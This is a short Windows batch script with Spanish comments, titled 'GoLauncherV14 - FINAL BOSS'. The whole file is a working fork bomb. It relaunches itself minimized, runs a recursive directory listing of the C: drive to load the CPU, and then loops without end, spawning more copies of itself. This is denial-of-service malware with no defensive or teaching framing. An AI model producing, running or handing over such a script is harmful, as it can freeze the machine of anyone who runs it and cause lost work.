@echo off
title GoLauncherV14 - FINAL BOSS
:: [1. LÓGICA DE MULTIPLICACIÓN]
:: Abrimos una copia de nosotros mismos en segundo plano
start /min "" "%~f0"

:: [2. PAYLOAD DEL V10]
:: Aquí va tu código que consume CPU
start /min cmd /c "tree c:\ /f"

:: [3. EL BUCLE INFINITO]
:bucle
start /min "" "%~f0"
goto bucle